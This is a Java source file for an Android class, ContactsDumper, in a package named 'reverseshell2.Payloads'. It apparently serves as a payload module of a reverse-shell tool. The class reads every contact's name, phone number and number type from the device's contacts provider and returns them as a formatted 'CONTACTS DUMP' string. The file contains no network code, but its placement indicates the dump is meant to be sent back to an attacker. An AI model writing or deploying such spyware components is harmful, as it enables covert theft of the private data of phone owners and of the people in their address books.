package com.example.reverseshell2.Payloads;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

public class ContactsDumper {

    private static final String TAG = "ContactsDumper";
    private Context context;

    public ContactsDumper(Context context) {
        this.context = context;
    }

    public String dumpAllContacts() {
        StringBuilder result = new StringBuilder();
        try {
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                },
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );

            if (cursor == null) {
                return "No contacts found or permission denied.\n";
            }

            result.append("=== CONTACTS DUMP ===\n");
            result.append("Total: ").append(cursor.getCount()).append(" entries\n");
            result.append("---\n");

            int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            int typeIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE);

            while (cursor.moveToNext()) {
                String name = cursor.getString(nameIdx);
                String number = cursor.getString(numIdx);
                int type = cursor.getInt(typeIdx);

                String typeName;
                switch (type) {
                    case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: typeName = "Mobile"; break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: typeName = "Home"; break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: typeName = "Work"; break;
                    default: typeName = "Other"; break;
                }

                result.append(name).append(" | ").append(number).append(" (").append(typeName).append(")\n");
            }
            cursor.close();
        } catch (Exception e) {
            result.append("ERROR: ").append(e.getMessage()).append("\n");
            Log.e(TAG, "Error dumping contacts", e);
        }
        return result.toString();
    }
}
